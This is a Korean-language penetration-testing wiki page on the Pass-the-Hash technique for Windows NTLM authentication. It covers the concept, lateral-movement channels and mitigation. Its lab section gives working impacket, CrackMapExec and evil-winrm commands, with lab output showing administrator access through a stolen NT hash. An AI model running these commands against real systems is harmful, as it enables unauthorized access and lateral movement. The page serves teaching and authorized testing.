# Pass-the-Hash

패스 더 해시 (Pass-the-Hash, PtH, PTH) 기법은 윈도우 NTLM 인증을 사용할 때 평문 비밀번호를 사용하지 않고, 그 비밀번호의 NT 해시를 사용해 인증하는 기법을 일컫는다. 패스 더 해시는 평범하게 NTLM 인증을 활용하는 기법 중 하나다. 만들어놓은 프로토콜을 의도한대로 평범하게 사용하는 것이다. [NTLM 인증의 개념은 따로 정리](../general-concepts/windows-authentication/ntlm.md)해놨으니 이 페이지에서는 다이어그램만 가져와서 사용하고, 자세한 설명은 생략한다.

![](../.gitbook/assets/ntlm-local-auth.drawio\(1\).png)

NTLM 인증이 이뤄지는 동안 유저의 평문 비밀번호는 사용되지 않는다. Challenge/Response 에서는 오로지 유저의 NT 해시화된 비밀번호로 암호화된 Challenge 만 서버와 클라이언트가 주고 받을 뿐이다.

공격자의 입장에서도 마찬가지다. LSASS 덤프 (TODO: 페이지 생성 + 링크)를 진행하다 보면 유저의 NT 해시를 얻을 때가 많다. 경우에 따라서 크래킹이 가능한 경우도 있지만, 비밀번호가 복잡하고 길때는 불가능할때도 많다. 하지만 NTLM 인증 프로토콜은 평문 비밀번호가 필요 없는 프로토콜이다. 더 정확하게는 평문 비밀번호를 굳이 알아낼 필요가 없다. NT 해시만 있으면 된다.

패스 더 해시는 원격 코드 실행 및 횡적이동에서 많이 사용된다.

* SMB + PsExec
* WMI
* WinRM
* RDP - 단, Restricted Admin (`HKLM\System\CurrentControlSet\Control\LSA, DisableRestrictedAdmin` 이 0이여야함)

등의 횡적 이동을 할 때 모두 평문 비밀번호 대신 패스 더 해시를 이용할 수 있다.

### 실습

많은 윈도우 + 리눅스 기반의 액티브 디렉토리 툴들은 기본적으로 패스 더 해시를 지원한다.예를 들어 impacket, CrackMapExec, Rubeus, Mimikatz 등이 있지만, 거의 왠만한 툴들은 다 지원한다고 보면 된다.

{% tabs %}
{% tab title="리눅스" %}
impacket 툴들의 경우 `-hashes` 플래그를 사용하며, LM:NT 형식의 해시가 필요하다. CME의 경우 그냥 NT 해시만 줘도 된다.

```
# Impacket 툴들의 "-hashes" 플래그 사용 
impacket-wmiexec domain.com/user@targetFQDN <command> -hashes '<LM:NT>'

impacket-wmiexec choi.local/Administrator@dc01.choi.local whoami -hashes 'aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe' 
Impacket v0.10.1.dev1+20220628.224634.5122bcf - Copyright 2022 SecureAuth Corporation

[*] SMBv3.0 dialect used
choi\administrator

# CME 의 -H 플래그 사용 
cme smb <FQDN/IP> -u <user> -H <NThash> -d <domain> 

cme smb 192.168.40.150 -u Administrator -H 2b576acbe6bcfda7294d6bd18041b8fe -d choi.local                                  
SMB         192.168.40.150  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:choi.local) (signing:True) (SMBv1:False)
SMB         192.168.40.150  445    DC01             [+] choi.local\Administrator:2b576acbe6bcfda7294d6bd18041b8fe (Pwn3d!)

cme smb 192.168.40.150 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe -d choi.local 
SMB         192.168.40.150  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:choi.local) (signing:True) (SMBv1:False)
SMB         192.168.40.150  445    DC01             [+] choi.local\Administrator:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe (Pwn3d!)

# WinRM을 이용한 패스 더 해시 
evil-winrm -i <ip> -u <user> -H <NThash> 
```
{% endtab %}

{% tab title="윈도우" %}
TODO
{% endtab %}
{% endtabs %}

### 특이 사항

패스 더 해시 기법의 가장 큰 오해는 바로 이것이 공격(attack)이라는 것이다. 패스 더 해시는 공격도 아니고, 특정 프로토콜을 악용(abuse)하는 것도 아니다. NTLM 인증 프로토콜의 취약점(vulnerability)는 더더욱 아니다. 따라서 내부망 모의해킹을 진행할 때도 이 PTH 를 취약점으로 적어놓는 실수를 하면 안된다.

### 대응 방안

앞서 서술했듯 패스 더 해시는 NTLM을 정상적으로 이용하는 한 방법이기 때문에 막을 방법이 없다. 그나마 AD에서 커버로스나 ADCS를 강제로 이용하게 하는 방법이 있지만, 이는 하위 호환성에 영향을 줄 가능성이 있어 실행하기 어렵다. 패스 더 해시를 막으려는 노력보단 애당초 공격자들이 NT 해시나 다른 계정 정보를 얻을 수 없게끔 보안을 강화하는 것이 추천된다.
